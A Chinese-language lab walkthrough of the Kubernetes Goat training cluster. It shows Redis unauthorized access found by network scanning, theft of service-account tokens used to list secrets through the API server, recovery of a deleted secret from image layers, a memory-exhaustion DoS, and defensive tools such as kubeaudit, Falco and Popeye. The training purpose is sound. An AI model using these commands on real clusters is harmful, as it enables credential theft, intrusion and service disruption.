中有不同的命名空间并且资源被部署和管理时，它们是安全的并且无法相互访问。 默认情况下，Kubernetes 使用平面网络架构，这意味着集群中的任何 pod/服务都可以与其他人通信。 默认情况下，集群内的命名空间没有任何网络安全限制。命名空间中的任何人都可以与其他命名空间通信。 启动环境 1kubectl run --rm -it hacker-container --image=madhuakula/hacker-container -- sh 先编辑vi /etc/zmap/blacklist.conf，注释里面的10.0.0.0/8这一行，不然不能扫描 1zmap -p 6379 10.0.0.0/8 -o results.csv 12345678910111213141516171819~ # ifconfig eth0 Link encap:Ethernet HWaddr 76:20:B2:1E:01:E8 inet addr:10.244.1.31 Bcast:10.244.1.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:2583424 errors:0 dropped:0 overruns:0 frame:0 TX packets:22995250 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:181718935 (173.2 MiB) TX bytes:1229657656 (1.1 GiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)~ # cat results.csv | grep 10.24410.244.1.5 12345~ # redis-cli -h 10.244.1.510.244.1.5:6379&gt; KEYS *1) &quot;SECRETSTUFF&quot;10.244.1.5:6379&gt; GET SECRETSTUFF&quot;k8s-goat-a5a3e446faafa9d0514b3ff396ab8a40&quot; 这其实在现实中就是redis未授权访问，Redis服务器假如以root身份运行，黑客就能够给root账户写入SSH公钥文件，然后直接通过SSH登录目标受害的服务器 获取环境信息通过/proc/self/cgroup 文件可以获取到docker容器的id 1234567891011121314root@nsfocus:/home# cat /proc/self/cgroup 12:blkio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope11:pids:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope10:rdma:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope9:devices:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope8:freezer:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope7:perf_event:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope6:cpuset:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope5:hugetlb:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope4:memory:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope3:net_cls,net_prio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope2:cpu,cpuacct:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope1:name=systemd:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope0::/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope 可以通过在node执行ps看到 12$ docker ps -a | grep 57025702cc4cdd60 madhuakula/k8s-goat-system-monitor &quot;gotty -w bash&quot; 6 days ago Up 6 days k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_0 其他的信息收集 1234567cat /proc/self/cgroupcat /etc/hosts# 挂载信息mount# 查看文件系统ls -la /home/printenv或者直接env 在环境变量中就有flag了 DOS内存或CPU等资源假如Kubernetes部署的yaml文件没有对资源的使用进行限制，那么攻击者可能就可以消耗pod/deployment的资源，从而对Kubernetes造成DOS 这里使用stress-ng压力测试程序来测试 先看看初始资源占用情况，cpu是0，内存是不超过10M 123$ docker stats --no-stream | grep hunger842e3f0c146a k8s_hunger-check_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0 0.00% 6.609MiB / 15.64GiB 0.04% 0B / 0B 0B / 0B 8302af9807534 k8s_POD_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0 0.00% 1.227MiB / 15.64GiB 0.01% 0B / 0B 0B / 0B 1 执行下面命令进行压力测试，–vm是启动8个worker去匿名mmap，–vm-bytes是每个worker分配的内存，但是我设置2G发现16内存没用满，只用了2-3G，所以索性改为16G，最后–timeout就是压力测试60s后停止 1stress-ng --vm 8 --vm-bytes 16G --timeout 60s 下面是压力测试中在node执行htop的截图 在node执行docker stats | grep hunger，到后面直接就获取不了 这样可能会使其他pod可能无法获得执行的资源，无法处理用户请求或者超级卡顿，假如是自己的服务器可能消耗更多的电费，假如是云服务则可能需要支付更加昂贵的账单。 我们查看一下部署的yaml文件，可以看到资源限制是被注释掉的，不过1000G跟没限制也差不多了 Hacker container1kubectl run -it --rm hacker-container --image=madhuakula/hacker-container -- sh 启动pod后我们可以用amicontained评估容器的权限等信息 123456789101112~ # amicontainedContainer Runtime: dockerHas Namespaces: pid: true user: falseAppArmor Profile: docker-default (enforce)Capabilities: BOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcapSeccomp: disabledBlocked Syscalls (22): MSGRCV SYSLOG SETSID VHANGUP PIVOT_ROOT ACCT SETTIMEOFDAY UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME INIT_MODULE DELETE_MODULE LOOKUP_DCOOKIE KEXEC_LOAD PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT FINIT_MODULE KEXEC_FILE_LOADLooking for Docker.sock 还可以用里面的nikto进行web漏洞扫描，看着效果不怎么样 123456789101112131415161718~ # nikto.pl -host http://metadata-db- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.105.74.206+ Target Hostname: metadata-db+ Target Port: 80+ Start Time: 2022-06-22 08:20:04 (GMT0)---------------------------------------------------------------------------+ Server: No banner retrieved+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ 7373 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time: 2022-06-22 08:21:53 (GMT0) (109 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 隐藏在镜像层中的信息在docker镜像中，很容易可能将密码、私钥、令牌等放入到了镜像中 作者设计了一个hidden-in-layers的jobs 12345$ kubectl get jobsNAME COMPLETIONS DURATION AGEbatch-check-job 1/1 36s 6d5hhidden-in-layers 0/1 6d5h 6d5hkube-bench-node 1/1 29s 46h 查看部署文件，确认镜像名称 12$ cat ~/kubernetes-goat/scenarios/hidden-in-layers/deployment.yaml | grep image image: madhuakula/k8s-goat-hidden-in-layers 到node查看镜像的信息，通过docker inspect可以看到最终执行的cmd命令，但是这样只能看到一个命令 1234567891011121314$ madhuakula/k8s-goat-hidden-in-layers | grep &quot;Cmd&quot; -A 5 &quot;Cmd&quot;: null, &quot;Image&quot;: &quot;&quot;, &quot;Volumes&quot;: null, &quot;WorkingDir&quot;: &quot;&quot;, &quot;Entrypoint&quot;: null, &quot;OnBuild&quot;: null,-- &quot;Cmd&quot;: [ &quot;sh&quot;, &quot;-c&quot;, &quot;tail -f /dev/null&quot; ], &quot;ArgsEscaped&quot;: true, 之前已经用过docker history来看每一层所执行的命令了，这里我们可以看到一个/root/secret.txt的文件，但是在后面删掉了 12345678$ docker history --no-trunc madhuakula/k8s-goat-hidden-in-layersIMAGE CREATED CREATED BY SIZE COMMENTsha256:8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607 5 weeks ago CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;] 0B buildkit.dockerfile.v0&lt;missing&gt; 5 weeks ago RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt &amp;&amp; rm -rf /root/secret.txt # buildkit 28B buildkit.dockerfile.v0&lt;missing&gt; 5 weeks ago ADD secret.txt /root/secret.txt # buildkit 41B buildkit.dockerfile.v0&lt;missing&gt; 5 weeks ago LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat 0B buildkit.dockerfile.v0&lt;missing&gt; 2 months ago /bin/sh -c #(nop) CMD [&quot;/bin/sh&quot;] 0B &lt;missing&gt; 2 months ago /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in / 5.57MB 还有一个工具是https://hub.docker.com/r/alpine/dfimage，这个更全面，基于https://github.com/P3GLEG/Whaler进行构建的，可以搜索secret files(通过将image保存到文件，之后解压搜索里面的文件)，打印环境变量（docker inspect获取），具体实现可以查看https://github.com/P3GLEG/Whaler/blob/master/main.go和https://github.com/P3GLEG/Whaler/blob/master/scanner.go 12345678910111213141516171819202122232425262728$ alias dfimage=&quot;docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage&quot;$ dfimage madhuakula/k8s-goat-hidden-in-layers:latestAnalyzing madhuakula/k8s-goat-hidden-in-layers:latestDocker Version: GraphDriver: overlay2Environment Variables|PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binImage user|User is rootPotential secrets:|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub Possible public key \\.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub Possible public key \\.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub Possible public key \\.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub Possible public key \\.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub Possible public key \\.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar|Found match etc/udhcpd.conf DHCP server configs dhcpd[^ ]*.conf 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tarDockerfile:CMD [&quot;/bin/sh&quot;]LABEL MAINTAINER=Madhu Akula INFO=Kubernetes GoatADD secret.txt /root/secret.txt # buildkit root/ root/secret.txtRUN RUN echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt \\ &amp;&amp; rm -rf /root/secret.txt # buildkitCMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;] 可以看到ADD secret.txt /root/secret.txt之后的几行有点异常，不过影响不大 搜索dfimage的时候，还有一个github上也叫dfimage的可以将镜像还原成一个Dockerfile，是基于docker history，不用我们自己手动还原 1https://github.com/LanikSJ/dfimage/blob/3d55b88596d5eec8d4beff171ad5d4931043ad19/entrypoint.py#L17 执行结果FROM这个输出肯定是不对的了，第二行也看不出什么 123456789$ docker run -v /var/run/docker.sock:/var/run/docker.sock dfimage madhuakula/k8s-goat-hidden-in-layers:latestFROM madhuakula/k8s-goat-hidden-in-layers:latestADD file:90e56af13188c7f0283d244a0d70b853d8bef8587a41f1da8eac3a2aba8964ef in /CMD [&quot;/bin/sh&quot;]RUN LABEL MAINTAINER=Madhu Akula INFO=Kubernetes GoatRUN ADD secret.txt /root/secret.txt # buildkitRUN RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt \\ &amp;&amp; rm -rf /root/secret.txt # buildkitRUN CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;] 但是这只是让我们看到有这个文件，我们需要看看这个文件，直接启动容器肯定没有，因为已经删掉了 123456789101112$ kubectl run test --rm --restart=Never -it --image=madhuakula/k8s-goat-hidden-in-layers -- shIf you don&apos;t see a command prompt, try pressing enter./ # lsbin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var/ # cd root/~ # ls -latotal 16drwx------ 1 root root 4096 Jun 24 08:33 .drwxr-xr-x 1 root root 4096 Jun 24 08:29 ..-rw------- 1 root root 19 Jun 24 08:34 .ash_history-rw-r--r-- 1 root root 28 May 16 20:41 contribution.txt~ # 但是在删掉的那一层的上一层还有，我们可以先将整个image保存到文件 1234567891011121314151617181920212223# root @ nsfocus in ~ [16:35:15]$ mkdir hidden-in-layers# root @ nsfocus in ~ [16:35:24]$ docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers/hidden-in-layers.tar# root @ nsfocus in ~ [16:35:48]$ cd hidden-in-layers/# root @ nsfocus in ~/hidden-in-layers [16:35:52]$ tar -xvf hidden-in-layers.tar66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/VERSION66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/json66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/layer.tar79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/VERSION79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/json79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607.jsonc8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/VERSIONc8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/jsonc8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/layer.tarmanifest.jsonrepositories 这里面有3层是有layer.tar文件的，少的时候我们当然可以全部一个一个解压，去找secret.txt 但是有个工具可以快速确认是哪个id的layer.tar，就是dive 12wget https://github.com/wagoodman/dive/releases/download/v0.10.0/dive_0.10.0_linux_amd64.debapt install ./dive_0.10.0_linux_amd64.deb 运行 1dive madhuakula/k8s-goat-hidden-in-layers 通过下图，我们就知道在66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535那里 最终获取到secret.txt文件 123456789101112131415161718# root @ nsfocus in ~/hidden-in-layers [16:39:52]$ cd 66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/# root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:54]$ lsjson layer.tar VERSION# root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:55]$ tar -xf ./layer.tar # root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:05]$ lsjson layer.tar root VERSION# root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:07]$ cd root/# root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root [16:40:10]$ lssecret.txt# root @ nsfocus in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root [16:40:12]$ cat secret.txt k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772 RBAC 最低权限配置错误在 Kubernetes 早期，没有 RBAC（role-based access control，基于角色的访问控制）这样的概念，主要使用 ABAC（attribute-based access control，基于属性的访问控制）。现在它拥有像 RBAC 这样的超能力来实现最小权限的安全原则。尽管如此，有时权限还是给多了。 目标挑战是查找k8svaultapikey 默认情况下，Kubernetes 将所有令牌和服务帐户信息存储在/var/run/secrets/kubernetes.io/serviceaccount/ 12345678910root@hunger-check-deployment-56d65977f6-k68g9:/# cd /var/run/secrets/kubernetes.io/serviceaccount/root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# ls -latotal 4drwxrwxrwt 3 root root 140 Jun 24 08:50 .drwxr-xr-x 3 root root 4096 Jun 16 02:55 ..drwxr-xr-x 2 root root 100 Jun 24 08:50 ..2022_06_24_08_50_43.045810252lrwxrwxrwx 1 root root 31 Jun 24 08:50 ..data -&gt; ..2022_06_24_08_50_43.045810252lrwxrwxrwx 1 root root 13 Jun 16 02:53 ca.crt -&gt; ..data/ca.crtlrwxrwxrwx 1 root root 16 Jun 16 02:53 namespace -&gt; ..data/namespacelrwxrwxrwx 1 root root 12 Jun 16 02:53 token -&gt; ..data/token 一些目录和地址在环境变量都有 1234root@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep SERVICEACCOUNTSERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccountroot@hunger-check-deployment-56d65977f6-k68g9:/var/run/secrets/kubernetes.io/serviceaccount# env | grep KUBERNETES_SERVICE_HOSTKUBERNETES_SERVICE_HOST=10.96.0.1 123456export APISERVER=https://$&#123;KUBERNETES_SERVICE_HOST&#125;export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount# 命令空间路径export NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)export TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)export CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt 这时我们就可以访问api服务器了，也看得服务器的真实ip 12345678910111213$ curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api&#123; &quot;kind&quot;: &quot;APIVersions&quot;, &quot;versions&quot;: [ &quot;v1&quot; ], &quot;serverAddressByClientCIDRs&quot;: [ &#123; &quot;clientCIDR&quot;: &quot;0.0.0.0/0&quot;, &quot;serverAddress&quot;: &quot;192.168.2.174:6443&quot; &#125; ]&#125; 查询default命名空间的secrets，可以看到没权限 123456789101112131415$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/secrets&#123; &quot;kind&quot;: &quot;Status&quot;, &quot;apiVersion&quot;: &quot;v1&quot;, &quot;metadata&quot;: &#123; &#125;, &quot;status&quot;: &quot;Failure&quot;, &quot;message&quot;: &quot;secrets is forbidden: User \\&quot;system:serviceaccount:big-monolith:big-monolith-sa\\&quot; cannot list resource \\&quot;secrets\\&quot; in API group \\&quot;\\&quot; at the cluster scope&quot;, &quot;reason&quot;: &quot;Forbidden&quot;, &quot;details&quot;: &#123; &quot;kind&quot;: &quot;secrets&quot; &#125;, &quot;code&quot;: 403&#125; 查看当前命名空间中的secrets 1curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets 查看当前命名空间中的pods 1curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/pods 1234567$ curl --cacert $&#123;CACERT&#125; --header &quot;Athorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api/v1/namespaces/$&#123;NAMESPACE&#125;/secrets | grep k8svaultapikey % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 9984 0 9984 0 0 154k 0 --:--:-- --:--:-- --:--:-- 154k &quot;kubectl.kubernetes.io/last-applied-configuration&quot;: &quot;&#123;\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;data\\&quot;:&#123;\\&quot;k8svaultapikey\\&quot;:\\&quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=\\&quot;&#125;,\\&quot;kind\\&quot;:\\&quot;Secret\\&quot;,\\&quot;metadata\\&quot;:&#123;\\&quot;annotations\\&quot;:&#123;&#125;,\\&quot;name\\&quot;:\\&quot;vaultapikey\\&quot;,\\&quot;namespace\\&quot;:\\&quot;big-monolith\\&quot;&#125;,\\&quot;type\\&quot;:\\&quot;Opaque\\&quot;&#125;\\n&quot; &quot;fieldsV1&quot;: &#123;&quot;f:data&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:k8svaultapikey&quot;:&#123;&#125;&#125;,&quot;f:metadata&quot;:&#123;&quot;f:annotations&quot;:&#123;&quot;.&quot;:&#123;&#125;,&quot;f:kubectl.kubernetes.io/last-applied-configuration&quot;:&#123;&#125;&#125;&#125;,&quot;f:type&quot;:&#123;&#125;&#125; &quot;k8svaultapikey&quot;: &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; 看着是base64 12$ echo &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; | base64 -dk8s-goat-85057846a8046a25b35f38f3a2649dce 我们回头来看部署的yaml，可以看到resources直接给了所有resources的get、 watch 和 list权限 KubeAudit - 审计 Kubernetes 集群kubeaudit是一个开源工具，这个工具需要cluster administrator privileges，tiller 这个账户有这个权限，所以指定serviceaccount为tiller启动hacker容器，但是我这没有这个账户， 123$ kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never -it --image=madhuakula/hacker-container -- bashFlag --serviceaccount has been deprecated, has no effect and will be removed in the future.Error from server (Forbidden): pods &quot;bash&quot; is forbidden: error looking up service account kube-system/tiller: serviceaccount &quot;tiller&quot; not found 我觉得本地模式ocal Mode最方便，直接在master下载一个bin，直接运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103$ ./kubeaudit allW0627 14:19:28.628353 95337 warnings.go:70] v1 ComponentStatus is deprecated in v1.19+W0627 14:19:32.831222 95337 warnings.go:70] extensions/v1beta1 Ingress is deprecated in v1.14+, unavailable in v1.22+; use networking.k8s.io/v1 IngressW0627 14:19:33.253577 95337 warnings.go:70] policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+---------------- Results for --------------- apiVersion: v1 kind: Namespace metadata: name: big-monolith---------------------------------------------- [error] MissingDefaultDenyIngressAndEgressNetworkPolicy Message: Namespace is missing a default deny ingress and egress NetworkPolicy. Metadata: Namespace: big-monolith ..................---------------- Results for --------------- apiVersion: apps/v1 kind: Deployment metadata: name: hunger-check-deployment namespace: big-monolith---------------------------------------------- [error] AppArmorAnnotationMissing Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hunger-check&apos; should be added. Metadata: Container: hunger-check MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hunger-check-- [error] CapabilityOrSecurityContextMissing Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL. Metadata: Container: hunger-check-- [warning] ImageTagMissing Message: Image tag is missing. Metadata: Container: hunger-check-- [warning] LimitsNotSet Message: Resource limits not set. Metadata: Container: hunger-check-- [error] RunAsNonRootPSCNilCSCNil Message: runAsNonRoot should be set to true or runAsUser should be set to a value &gt; 0 either in the container SecurityContext or PodSecurityContext. Metadata: Container: hunger-check-- [error] AllowPrivilegeEscalationNil Message: allowPrivilegeEscalation not set which allows privilege escalation. It should be set to &apos;false&apos;. Metadata: Container: hunger-check-- [warning] PrivilegedNil Message: privileged is not set in container SecurityContext. Privileged defaults to &apos;false&apos; but it should be explicitly set to &apos;false&apos;. Metadata: Container: hunger-check-- [error] ReadOnlyRootFilesystemNil Message: readOnlyRootFilesystem is not set in container SecurityContext. It should be set to &apos;true&apos;. Metadata: Container: hunger-check-- [error] SeccompAnnotationMissing Message: Seccomp annotation is missing. The annotation seccomp.security.alpha.kubernetes.io/pod: runtime/default should be added. Metadata: MissingAnnotation: seccomp.security.alpha.kubernetes.io/pod..................---------------- Results for --------------- apiVersion: batch/v1 kind: Job metadata: name: hidden-in-layers namespace: default---------------------------------------------- [error] AppArmorAnnotationMissing Message: AppArmor annotation missing. The annotation &apos;container.apparmor.security.beta.kubernetes.io/hidden-in-layers&apos; should be added. Metadata: Container: hidden-in-layers MissingAnnotation: container.apparmor.security.beta.kubernetes.io/hidden-in-layers-- [error] AutomountServiceAccountTokenTrueAndDefaultSA Message: Default service account with token mounted. automountServiceAccountToken should be set to &apos;false&apos; on either the ServiceAccount or on the PodSpec or a non-default service account should be used.-- [error] CapabilityOrSecurityContextMissing Message: Security Context not set. The Security Context should be specified and all Capabilities should be dropped by setting the Drop list to ALL. Metadata: Container: hidden-in-layers 通过查看结果，这个工具会对Namespace、Deployment 、DaemonSet和Job这些类型进行检查。 Falco - 运行时安全监控和检测需要安装helm v3，安装：https://helm.sh/docs/intro/install/ 将 helm chart 部署到 Kubernetes 集群中，并安装falco 123helm repo add falcosecurity https://falcosecurity.github.io/chartshelm repo updatehelm install falco falcosecurity/falco 123456789101112131415161718192021222324252627282930# root @ k8s-master in ~/kubernetes-goat/kubeaudit [14:39:48]$ helm repo add falcosecurity https://falcosecurity.github.io/charts&quot;falcosecurity&quot; has been added to your repositories# root @ k8s-master in ~/kubernetes-goat/kubeaudit [14:40:12]$ helm repo updateHang tight while we grab the latest from your chart repositories......Successfully got an update from the &quot;falcosecurity&quot; chart repositoryUpdate Complete. ⎈Happy Helming!⎈# root @ k8s-master in ~/kubernetes-goat/kubeaudit [14:42:00]$ helm install falco falcosecurity/falcoNAME: falcoLAST DEPLOYED: Mon Jun 27 14:50:10 2022NAMESPACE: defaultSTATUS: deployedREVISION: 1TEST SUITE: NoneNOTES:Falco agents are spinning up on each node in your cluster. After a fewseconds, they are going to start monitoring your containers looking forsecurity issues.No further action should be required.Tip: You can easily forward Falco events to Slack, Kafka, AWS Lambda and more with falcosidekick. Full list of outputs: https://github.com/falcosecurity/charts/tree/master/falcosidekick.You can enable its deployment with `--set falcosidekick.enabled=true` or in your values.yaml. See: https://github.com/falcosecurity/charts/blob/master/falcosidekick/values.yaml for configuration values. Falco 可以检测任何涉及进行 Linux 系统调用的行为并发出警报。Falco 警报可以通过使用特定的系统调用、它们的参数以及调用进程的属性来触发。例如，Falco 可以轻松检测事件，包括但不限于： shell 在 Kubernetes 的容器或 pod 中运行。 容器正在特权模式下运行，或者mount到敏感路径，比如/proc。 生成意外的子进程。 意外读取敏感文件，例如/etc/shadow. 将非设备类型的文件写入/dev. 标准的系统二进制文件（例如ls）对外网络连接。 特权 pod 在 Kubernetes 集群中启动。 查看falco pod的状态 1kubectl get pods --selector app=falco 从 Falco 系统获取日志 1kubectl logs -f -l app=falco 我们尝试启动一个madhuakula/hacker-container，并读取敏感文件/etc/shadow，看看falco是否会检测到 123kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bashcat /etc/shadowvi /etc/shadow 手动获取的日志因为输出缓存区的原因可能输出会延迟，所以想快点看到结果可以多次执行命令 Popeye - Kubernetes 集群sanitizerPopeye 是一个实用程序，可扫描实时 Kubernetes 集群并报告已部署资源和配置的潜在问题。 能够检测的问题可以查看https://popeyecli.io/的Sanitizers标题 下载 12wget https://github.com/derailed/popeye/releases/download/v0.10.0/popeye_Linux_x86_64.tar.gztar -xvf popeye_Linux_x86_64.tar.gz 直接运行二进制文件即可 最后还给你的集群评个分 使用 NSP 保护网络边界创建实验环境，启动一个nginx 1kubectl run --image=nginx website --labels app=website --expose --port 80 启动另一个pod尝试访问这个nginx，可以看到可以访问 123456789101112131415161718192021222324252627$ kubectl run --rm -it --image=alpine temp -- shIf you don&apos;t see 